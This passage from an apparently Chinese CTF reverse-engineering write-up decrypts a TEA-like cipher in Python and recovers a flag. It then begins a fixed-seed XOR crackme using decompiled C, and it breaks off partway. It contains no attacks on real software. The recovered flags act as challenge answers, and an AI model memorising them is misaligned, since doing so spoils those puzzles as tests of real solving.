<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_little_endian</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(byte_array[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_array), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_little_endian</span>(<span class="params">dword_array</span>):</span><br><span class="line">    byte_list = []</span><br><span class="line">    <span class="keyword">for</span> dword <span class="keyword">in</span> dword_array:</span><br><span class="line">        byte_list.extend(dword.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> byte_list</span><br><span class="line"></span><br><span class="line">delta = [<span class="number">0x3CA6F3E</span>, <span class="number">0xF2E1C7F1</span>, <span class="number">0x79A22843</span>, <span class="number">0xD47FFC9D</span>, <span class="number">0xDD10F4C</span>, <span class="number">0x1DC368A1</span>, <span class="number">0x11B15F8A</span>, <span class="number">0x9469B3CD</span>, </span><br><span class="line">         <span class="number">0x45D6DB5F</span>, <span class="number">0xBC6EE006</span>, <span class="number">0xA76D8146</span>, <span class="number">0xD542E337</span>, <span class="number">0x242E1155</span>, <span class="number">0xAA7F93DD</span>, <span class="number">0x88625ECB</span>, <span class="number">0x3738E499</span>, </span><br><span class="line">         <span class="number">0xCEF27BB0</span>, <span class="number">0x134FF759</span>, <span class="number">0x358CA57E</span>, <span class="number">0x3461F310</span>, <span class="number">0x28540EE7</span>, <span class="number">0x81C0B176</span>, <span class="number">0xF725EE9C</span>, <span class="number">0xAF823A69</span>, </span><br><span class="line">         <span class="number">0x61E8ECB3</span>, <span class="number">0xF4919548</span>, <span class="number">0x6AF44E11</span>, <span class="number">0x866162F3</span>, <span class="number">0x867F7E65</span>, <span class="number">0x6B26444C</span>, <span class="number">0x10216241</span>, <span class="number">0x9C1BA3CD</span>, </span><br><span class="line">         <span class="number">0x1268FEAD</span>, <span class="number">0xF462B3B5</span>, <span class="number">0x5F7DE761</span>, <span class="number">0x72EAD5B6</span>, <span class="number">0xFBCE0C75</span>, <span class="number">0x44EF4142</span>, <span class="number">0x54DCC3C0</span>, <span class="number">0xAFFE805D</span>, </span><br><span class="line">         <span class="number">0xC8833729</span>, <span class="number">0x3C944186</span>, <span class="number">0x261169A</span>, <span class="number">0xB547EA2F</span>, <span class="number">0x9B499585</span>, <span class="number">0xFE0190BF</span>, <span class="number">0x1EC74BE7</span>, <span class="number">0xAFC9292E</span>, </span><br><span class="line">         <span class="number">0xC32F4EEF</span>, <span class="number">0x420A1A4</span>, <span class="number">0x94BEAB2B</span>, <span class="number">0xA0693238</span>, <span class="number">0x4DD5ADC1</span>, <span class="number">0x9F658F31</span>, <span class="number">0x1732EA46</span>, <span class="number">0x76BEE7DD</span>, </span><br><span class="line">         <span class="number">0x12C63095</span>, <span class="number">0x9C202C7C</span>, <span class="number">0xAC9BB4C4</span>, <span class="number">0x1762AEAF</span>, <span class="number">0xCA41991E</span>, <span class="number">0xC0480F85</span>, <span class="number">0xBF534431</span>, <span class="number">0xF1C2780E</span>, </span><br><span class="line">         <span class="number">0x990A7D6F</span>, <span class="number">0x69D22B81</span>, <span class="number">0x34DDECDE</span>, <span class="number">0x11ECD8F8</span>, <span class="number">0x22BB55D2</span>, <span class="number">0xFFA55B0</span>, <span class="number">0x6CC1AFBF</span>, <span class="number">0xA5610F61</span>, </span><br><span class="line">         <span class="number">0x13190C95</span>, <span class="number">0xE09A5D29</span>, <span class="number">0xE7514731</span>, <span class="number">0x9AE21D7A</span>, <span class="number">0xB8D90F5A</span>, <span class="number">0x4C7299A9</span>, <span class="number">0xC4FDB94E</span>, <span class="number">0xA6475083</span>, </span><br><span class="line">         <span class="number">0xBFB62E5</span>, <span class="number">0x8F7F77EB</span>, <span class="number">0xDA2568BB</span>, <span class="number">0x55C4DA9E</span>, <span class="number">0xC2932973</span>, <span class="number">0xCBC60B6D</span>, <span class="number">0xC46720FD</span>, <span class="number">0x2046D79D</span>, </span><br><span class="line">         <span class="number">0x629CBD81</span>, <span class="number">0x932B1F48</span>, <span class="number">0x72ED29C0</span>, <span class="number">0xF4B566D3</span>, <span class="number">0xCBC53B21</span>, <span class="number">0x7836C87B</span>, <span class="number">0xBA4357B1</span>, <span class="number">0xCFD332E2</span>, </span><br><span class="line">         <span class="number">0x4D488FCB</span>, <span class="number">0xA06DEFBF</span>, <span class="number">0x68211846</span>, <span class="number">0xC17F878D</span>, <span class="number">0x33B10E2C</span>, <span class="number">0xCFA0E756</span>, <span class="number">0x4C3C0691</span>, <span class="number">0x870BE107</span>, </span><br><span class="line">         <span class="number">0x55B3FAF0</span>, <span class="number">0xFD39F8D7</span>, <span class="number">0x4B9A7795</span>, <span class="number">0x188CFA42</span>, <span class="number">0xAA79A09D</span>, <span class="number">0x620CF186</span>, <span class="number">0xEFDE898A</span>, <span class="number">0x2FA95D43</span>, </span><br><span class="line">         <span class="number">0xD67359DB</span>, <span class="number">0x8625BC1B</span>, <span class="number">0x7A1A3BBC</span>, <span class="number">0xE6ECEF6C</span>, <span class="number">0xBA27A5C6</span>, <span class="number">0x559FE417</span>, <span class="number">0xF01DF04D</span>, <span class="number">0x3F910D52</span>, </span><br><span class="line">         <span class="number">0x382B7BE</span>, <span class="number">0xAAECB195</span>, <span class="number">0x2E440D8E</span>, <span class="number">0xB3D58B0B</span>, <span class="number">0x3CA704B8</span>, <span class="number">0x63293098</span>, <span class="number">0x714CFD4D</span>, <span class="number">0x47C8D0F7</span>]</span><br><span class="line"></span><br><span class="line">sa1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, </span><br><span class="line">       <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, </span><br><span class="line">       <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">       <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">sh2 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, </span><br><span class="line">       <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, </span><br><span class="line">       <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, </span><br><span class="line">       <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br><span class="line">sa3 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, </span><br><span class="line">       <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, </span><br><span class="line">       <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, </span><br><span class="line">       <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">sh4 = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, </span><br><span class="line">       <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, </span><br><span class="line">       <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, </span><br><span class="line">       <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x11223344</span>, <span class="number">0x55667788</span>, <span class="number">0x9900AABB</span>, <span class="number">0xCCDDEEFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#正向加密测试</span></span><br><span class="line">m = [<span class="number">0x30303030</span>,<span class="number">0x30303030</span>]</span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    total = (total + delta[i]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">1</span>] &amp; <span class="number">0x80000000</span>: </span><br><span class="line">        sar_m1 = (m[<span class="number">1</span>] &gt;&gt; sa1[i]) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">0x20</span> - sa1[i]))</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        sar_m1 = (m[<span class="number">1</span>] &gt;&gt; sa1[i])</span><br><span class="line">    m[<span class="number">0</span>] = (m[<span class="number">0</span>] + (((m[<span class="number">1</span>] &lt;&lt; sh2[i]) + key[<span class="number">0</span>]) ^ (m[<span class="number">1</span>] + total) ^ (sar_m1 + key[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>] &amp; <span class="number">0x80000000</span>: </span><br><span class="line">        sar_m0 = (m[<span class="number">0</span>] &gt;&gt; sa3[i]) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">0x20</span> - sa3[i]))</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        sar_m0 = (m[<span class="number">0</span>] &gt;&gt; sa3[i])</span><br><span class="line">    m[<span class="number">1</span>] = (m[<span class="number">1</span>] + (((m[<span class="number">0</span>] &lt;&lt; sh4[i]) + key[<span class="number">2</span>]) ^ (m[<span class="number">0</span>] + total) ^ (sar_m0 + key[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#逆向解密</span></span><br><span class="line">encflag = [<span class="number">0x58</span>, <span class="number">0xbe</span>, <span class="number">0xd3</span>, <span class="number">0x0b</span>, <span class="number">0xfb</span>, <span class="number">0xbb</span>, <span class="number">0x73</span>, <span class="number">0xbe</span>, </span><br><span class="line">           <span class="number">0x4e</span>, <span class="number">0xaf</span>, <span class="number">0xc8</span>, <span class="number">0xc8</span>, <span class="number">0x86</span>, <span class="number">0x7d</span>, <span class="number">0x3c</span>, <span class="number">0x0b</span>, </span><br><span class="line">           <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0x25</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0xe0</span>, <span class="number">0x8f</span>, <span class="number">0x1d</span>, </span><br><span class="line">           <span class="number">0x0c</span>, <span class="number">0x18</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x23</span>, <span class="number">0x9d</span>, <span class="number">0xcf</span>, <span class="number">0xf5</span>, </span><br><span class="line">           <span class="number">0x99</span>, <span class="number">0xb5</span>, <span class="number">0xa8</span>, <span class="number">0xb7</span>, <span class="number">0x3d</span>, <span class="number">0x0f</span>, <span class="number">0x63</span>, <span class="number">0xae</span>]</span><br><span class="line"></span><br><span class="line">dwordenc = bytes_to_dwords_little_endian(encflag)</span><br><span class="line">dwordflag = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dwordenc) // <span class="number">2</span>):</span><br><span class="line">    m = [dwordenc[<span class="number">2</span> * j], dwordenc[<span class="number">2</span> * j + <span class="number">1</span>]]</span><br><span class="line">    total = <span class="built_in">sum</span>(delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">0</span>] &amp; <span class="number">0x80000000</span>: </span><br><span class="line">            sar_m0 = (m[<span class="number">0</span>] &gt;&gt; sa3[i]) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">0x20</span> - sa3[i]))</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            sar_m0 = (m[<span class="number">0</span>] &gt;&gt; sa3[i])</span><br><span class="line">        m[<span class="number">1</span>] = (m[<span class="number">1</span>] - (((m[<span class="number">0</span>] &lt;&lt; sh4[i]) + key[<span class="number">2</span>]) ^ (m[<span class="number">0</span>] + total) ^ (sar_m0 + key[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">1</span>] &amp; <span class="number">0x80000000</span>: </span><br><span class="line">            sar_m1 = (m[<span class="number">1</span>] &gt;&gt; sa1[i]) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">0x20</span> - sa1[i]))</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            sar_m1 = (m[<span class="number">1</span>] &gt;&gt; sa1[i])</span><br><span class="line">        m[<span class="number">0</span>] = (m[<span class="number">0</span>] - (((m[<span class="number">1</span>] &lt;&lt; sh2[i]) + key[<span class="number">0</span>]) ^ (m[<span class="number">1</span>] + total) ^ (sar_m1 + key[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">        total = (total - delta[i]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    dwordflag.append(m[<span class="number">0</span>])</span><br><span class="line">    dwordflag.append(m[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag = dwords_to_bytes_little_endian(dwordflag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i]),end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>

<p>得到flag：<font color=deepskyblue><strong>flag{UG1y_T3A_m@k35_[m3]_fe31_NaU5Eou5!}</strong></font>.</p>
<h2 id="randomXor："><a href="#randomXor：" class="headerlink" title="randomXor："></a>randomXor：</h2><p>查看main：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to house of jjkk&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == len )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(<span class="number">114514LL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">127</span>; ++i )</span><br><span class="line">      input[i] ^= rand();</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(input, &amp;cipher, len) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Right! &quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong! &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Lenth wrong! &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是一个固定的随机数异或加密，flag长度为128字节，但是直接用系统的srand和rand模拟发现输出的是乱码，仔细查看后发现这里的srand和rand都是自定义函数，由于异或的自反性，直接把这些函数复制粘贴，提取密文，进行解密：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 